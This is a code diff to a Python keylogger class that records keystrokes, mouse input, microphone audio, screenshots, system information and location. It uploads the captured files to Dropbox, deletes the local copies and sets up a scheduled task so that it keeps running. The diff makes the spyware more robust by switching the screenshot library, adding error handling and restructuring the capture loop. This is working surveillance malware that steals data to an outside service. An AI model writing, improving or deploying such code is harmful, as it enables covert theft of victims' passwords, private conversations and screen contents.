@@ -2,9 +2,9 @@ from pynput import keyboard, mouse
 from requests.adapters import HTTPAdapter
 import dropbox
 import geocoder
+import mss
 import os
 import platform
-import pyscreenshot
 import socket
 import sounddevice as sd
 import ssl
@@ -128,7 +128,9 @@ class KeyLogger:
             print(f"Error: {e}")
             return
 
-        upload_to_dropbox(socket.gethostname(), dbx, wav_and_png_files, self.dest_folder)
+        upload_to_dropbox(
+            socket.gethostname(), dbx, wav_and_png_files, self.dest_folder
+        )
 
         delete_wav_and_png_files(self.dest_folder)
 
@@ -136,10 +138,21 @@ class KeyLogger:
 
     def cleanup(self):
         self.log = ""
-        if self.keyboard_listener and self.keyboard_listener.running:
+
+        if (
+            hasattr(self, "keyboard_listener")
+            and self.keyboard_listener
+            and self.keyboard_listener.running
+        ):
             self.keyboard_listener.stop()
-        if self.mouse_listener and self.mouse_listener.running:
+
+        if (
+            hasattr(self, "mouse_listener")
+            and self.mouse_listener
+            and self.mouse_listener.running
+        ):
             self.mouse_listener.stop()
+
         self.word = ""
 
     def system_information(self):
@@ -192,20 +205,26 @@ class KeyLogger:
         self.appendlog("\nmicrophone used.")
 
     def screenshot(self):
-        filename = os.path.join(self.dest_folder, f"screenshot_{time.time()}.png")
-        img = pyscreenshot.grab()
-        img.save(filename)
-        self.appendlog("\nscreenshot used.")
+        if os.path.exists(self.dest_folder) and os.path.isdir(self.dest_folder):
+            try:
+                filename = os.path.join(
+                    self.dest_folder, f"screenshot_{time.time()}.png"
+                )
+                with mss.mss() as sct:
+                    sct.shot(output=filename)
+                self.appendlog("\nscreenshot used.")
+            except Exception as e:
+                self.appendlog(f"\nError taking screenshot: {e}")
 
     def run(self):
         remove_env_file()
         executable_path = save_program_in_location(self.src_file, self.dest_folder)
         create_scheduled_task(executable_path, self.task_name)
 
-        while True:
-            self.system_information()
-            self.get_location()
+        self.system_information()
+        self.get_location()
 
+        while True:
             self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
             self.keyboard_listener.start()
 
@@ -222,7 +241,7 @@ class KeyLogger:
             self.report()
 
             if self.magic_word != "" and self.magic_word in self.word:
-                break
+                return
 
             self.cleanup()  # this cleanup is used until the while loop works
         self.cleanup()  # this cleanup is used when the while loop stops
